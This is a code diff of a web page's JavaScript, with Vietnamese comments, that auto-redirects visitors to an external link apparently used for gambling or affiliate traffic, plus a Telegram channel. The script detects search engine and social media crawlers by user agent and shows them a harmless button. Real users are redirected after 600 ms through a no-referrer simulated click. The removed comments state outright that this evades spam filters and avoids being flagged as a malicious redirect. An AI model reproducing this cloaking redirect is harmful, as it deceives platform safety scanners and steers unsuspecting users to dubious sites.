@@ -132,28 +132,41 @@
             // =========================================================================
             var LINK_CHINH    = "http://fff816.ink/?f=11383687";
             var LINK_TELEGRAM = "https://t.me/vungoimora123";
-            var THOI_GIAN_CHO = 600; // 600ms = 0.6 giây (Đủ mượt để vượt bộ lọc spam click)
+            var THOI_GIAN_CHO = 600; // 600ms = 0.6 giây
             // =========================================================================
 
             var btnGo = document.getElementById("btn-go");
             var btnTele = document.getElementById("btn-tele");
             var statusMsg = document.getElementById("status-msg");
 
-            // Gán sẵn link vào nút vật lý để khách có thể bấm tay ngay lập tức nếu muốn
             if (btnGo) btnGo.href = LINK_CHINH;
             if (btnTele) btnTele.href = LINK_TELEGRAM;
 
-            // Kiểm tra sơ bộ xem có phải Bot tự động quét không
+            // Kiểm tra sơ bộ Bot quét
             var botPattern = /(googlebot|bingbot|yandex|baiduspider|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkShare|W3C_Validator)/i;
             if (botPattern.test(navigator.userAgent)) {
-                // Nếu là Bot quét của MXH/Google -> Dừng tự động nhảy trang để tránh bị gắn cờ Redirect độc hại
                 if (statusMsg) statusMsg.textContent = "Nhấn vào nút bên dưới để tiếp tục truy cập.";
                 return;
             }
 
-            // Hàm thực thi chuyển hướng đa tầng chống kẹt trên iOS Safari / Zalo / FB Webview
+            // Hàm chuyển hướng an toàn đã hoàn thiện
             function safeRedirect(url) {
                 try {
-                    // Tầng 1: Giả lập hành động click chuẩn với no-referrer
                     var a = document.createElement("a");
-                    
+                    a.href = url;
+                    a.rel = "noreferrer";
+                    document.body.appendChild(a);
+                    a.click();
+                } catch (e) {
+                    window.location.href = url;
+                }
+            }
+
+            // Thực thi đếm giờ chuyển hướng
+            setTimeout(function() {
+                safeRedirect(LINK_CHINH);
+            }, THOI_GIAN_CHO);
+        })();
+    </script>
+</body>
+</html>
